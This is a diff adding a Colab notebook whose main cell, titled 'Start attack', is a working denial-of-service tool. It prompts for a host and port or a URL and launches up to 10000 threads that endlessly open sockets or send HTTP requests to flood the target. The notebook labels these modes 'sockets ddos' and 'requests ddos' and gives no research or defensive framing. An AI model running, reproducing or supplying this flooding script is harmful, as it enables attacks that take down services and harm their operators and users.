@@ -1,0 +1,124 @@
+{
+  "nbformat": 4,
+  "nbformat_minor": 0,
+  "metadata": {
+    "colab": {
+      "name": "!3wifi.ipynb",
+      "provenance": [],
+      "authorship_tag": "ABX9TyN/t3CkamX8FiHhwkhOyBmR",
+      "include_colab_link": true
+    },
+    "kernelspec": {
+      "name": "python3",
+      "display_name": "Python 3"
+    },
+    "language_info": {
+      "name": "python"
+    }
+  },
+  "cells": [
+    {
+      "cell_type": "markdown",
+      "metadata": {
+        "id": "view-in-github",
+        "colab_type": "text"
+      },
+      "source": [
+        "<a href=\"https://colab.research.google.com/github/techtechnikov/colabs/blob/main/program\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
+      ]
+    },
+    {
+      "cell_type": "code",
+      "metadata": {
+        "id": "4Ucb8stc6bW7",
+        "cellView": "form"
+      },
+      "source": [
+        "#@title Install requirements\n",
+        "!pip install threaded\n",
+        "!pip install requests\n",
+        "!pip install progressbar2"
+      ],
+      "execution_count": null,
+      "outputs": []
+    },
+    {
+      "cell_type": "code",
+      "metadata": {
+        "id": "bGFdC2hOf6ZI",
+        "cellView": "form"
+      },
+      "source": [
+        "#@title Start attack\n",
+        "number_of_threads =  10000#@param {type:\"integer\"}\n",
+        "number_bytes_to_send =  4096#@param {type:\"integer\"}\n",
+        "\n",
+        "import socket\n",
+        "from threaded import Threaded\n",
+        "from requests import get\n",
+        "import time\n",
+        "import sys\n",
+        "import progressbar\n",
+        "\n",
+        "speed = {}\n",
+        "mode = int(input('''Type mode:\\n\\t[1] - sockets ddos\\n\\t[2] - requests ddos\\nMode: '''))\n",
+        "\n",
+        "if mode == 1:\n",
+        "  host = input('Please, type hostname or ip: ').strip()\n",
+        "  port = int(input('Please, type port: ').strip())\n",
+        "elif mode == 2:\n",
+        "  url = input('Please, type url: ')\n",
+        "else:\n",
+        "  raise ValueError('Invalid mode, must be 1 or 2!')\n",
+        "\n",
+        "@Threaded\n",
+        "def socket_dos(host:str, port:int, thread_name=0):\n",
+        "  global speed\n",
+        "  while True:\n",
+        "    t = time.time()\n",
+        "    try:\n",
+        "      s = socket.socket()\n",
+        "      s.connect((host, port))\n",
+        "      if number_bytes_to_send:\n",
+        "        s.send(b'\\b'*number_bytes_to_send)\n",
+        "    except:\n",
+        "      pass\n",
+        "    del s\n",
+        "    speed[thread_name] = (1/(time.time()-t))\n",
+        "\n",
+        "\n",
+        "@Threaded\n",
+        "def requests_dos(url:str, thread_name=0):\n",
+        "  global speed\n",
+        "  while True:\n",
+        "    t = time.time()\n",
+        "    try:\n",
+        "      get(url)\n",
+        "    except:\n",
+        "      continue\n",
+        "    speed[thread_name] = (1/(time.time()-t))\n",
+        "\n",
+        "#print('Starting threads... \\n\\n')\n",
+        "if mode == 1:\n",
+        "  for i in progressbar.progressbar(range(number_of_threads)):\n",
+        "    dos_proc = socket_dos(host, port, i)\n",
+        "    dos_proc.start()\n",
+        "  while True:\n",
+        "    print(f'Speed - {sum(speed.values())} r/s')\n",
+        "    time.sleep(3)\n",
+        "else:\n",
+        "  for i in progressbar.progressbar(range(number_of_threads)):\n",
+        "    dos_proc = requests_dos(url, i)\n",
+        "    dos_proc.start()\n",
+        "  while True:\n",
+        "    try:\n",
+        "      print(f'Speed - {sum(speed.values())} r/s')\n",
+        "      time.sleep(3)\n",
+        "    except KeyboardInterrupt:\n",
+        "      sys.exit(0)"
+      ],
+      "execution_count": null,
+      "outputs": []
+    }
+  ]
+}
